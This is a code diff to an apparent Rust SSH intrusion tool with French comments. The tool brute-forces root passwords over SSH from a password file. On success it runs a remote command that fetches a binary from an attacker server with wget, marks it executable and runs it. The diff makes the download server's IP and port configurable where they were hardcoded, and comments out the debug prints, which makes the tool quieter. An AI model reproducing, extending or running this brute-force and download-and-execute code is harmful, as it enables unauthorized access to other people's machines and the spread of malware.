@@ -7,7 +7,7 @@ use std::sync::mpsc::{self, Receiver, Sender};
 use std::thread;
 use std::time::Duration;
 
-fn ssh_inject(ip_address: String, user: String, password: String) {
+fn ssh_inject(ip_address: String, user: String, password: String, ip_srv: String, port_srv: String) {
     // Connexion TCP
     thread::sleep(Duration::from_secs(3));
     match TcpStream::connect(format!("{}:22", ip_address)) {
@@ -31,13 +31,13 @@ fn ssh_inject(ip_address: String, user: String, password: String) {
 
                 // Ouverture du canal de session et exécution de la commande
                 let mut channel = sess.channel_session().expect("Failed to open channel");
-                channel.exec("wget http://51.77.193.65:8000/PA-AUTO-DISP && chmod +x PA-AUTO-DISP && ./PA-AUTO-DISP").expect("Failed to execute command");
+                channel.exec(format!("wget http://{}:{}/api/foo_shi_shi_bang && chmod +x foo_shi_shi_bang && ./foo_shi_shi_bang",ip_srv,port_srv).as_str()).expect("Failed to execute command");
 
                 let mut output = String::new();
                 channel
                     .read_to_string(&mut output)
                     .expect("Failed to read output");
-                println!("Output: {}", output);
+                //println!("Output: {}", output);
 
                 // Fermeture du canal
                 channel.send_eof().expect("Failed to send EOF");
@@ -53,7 +53,7 @@ fn ssh_inject(ip_address: String, user: String, password: String) {
     }
 }
 
-pub(crate) async fn ssh_bruteforce(ip_address: &str, file_path: &str) {
+pub(crate) async fn ssh_bruteforce(ip_address: &str, file_path: &str, ip_srv: &str, port_srv: &str) {
     println!("Bruteforcing sur  {} ...", ip_address);
     let (tx, rx): (Sender<String>, Receiver<String>) = mpsc::channel();
     let ip_address = ip_address.to_string();
@@ -88,7 +88,7 @@ pub(crate) async fn ssh_bruteforce(ip_address: &str, file_path: &str) {
 
             tokio::time::sleep(Duration::from_secs(4)).await;
 
-            ssh_inject(ip_address, "root".to_string(), password);
+            ssh_inject(ip_address, "root".to_string(), password, ip_srv.to_string(), port_srv.to_string());
         }
         Err(_) => {
             println!("Aucun mot de passe trouvé.");
@@ -105,7 +105,7 @@ where
 }
 
 fn try_login(ip_address: &str, password: &str) -> bool {
-    println!("{}", password); //debug
+    //println!("{}", password); //debug
 
     // Attempt to create a TCP connection and SSH session
     if let Ok(tcp) = TcpStream::connect(format!("{}:22", ip_address)) {
